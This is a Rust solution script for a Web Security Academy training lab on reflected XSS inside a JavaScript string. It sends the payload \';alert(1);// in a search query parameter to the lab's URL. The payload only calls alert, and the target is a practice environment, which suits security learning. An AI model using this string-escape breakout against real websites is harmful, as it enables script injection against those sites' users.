/*******************************************************************
*
* Lab: Reflected XSS into a JavaScript string with angle brackets 
*      and double quotes HTML-encoded and single quotes escaped
*
* Hack Steps: 
*      1. Inject payload in the search query parameter
*      2. Observe that the alert function has been called
*
********************************************************************/
use reqwest::{
    blocking::{Client, ClientBuilder},
    redirect::Policy,
};
use std::{
    io::{self, Write},
    time::Duration,
};
use text_colorizer::Colorize;

// Change this to your lab URL
const LAB_URL: &str = "https://0ab60048035c156581d88e5f00a30037.web-security-academy.net";

fn main() {
    let payload = r###"\';alert(1);//"###;

    print!("❯❯ Injecting payload in the search query parameter.. ");
    io::stdout().flush().unwrap();

    let client = build_web_client();
    client
        .get(format!("{LAB_URL}?search={payload}"))
        .send()
        .expect(&format!(
            "{}",
            "⦗!⦘ Failed to fetch the page with the injected payload".red()
        ));

    println!("{}", "OK".green());
    println!("🗹 The lab should be marked now as {}", "solved".green())
}

fn build_web_client() -> Client {
    ClientBuilder::new()
        .redirect(Policy::none())
        .connect_timeout(Duration::from_secs(5))
        .build()
        .unwrap()
}
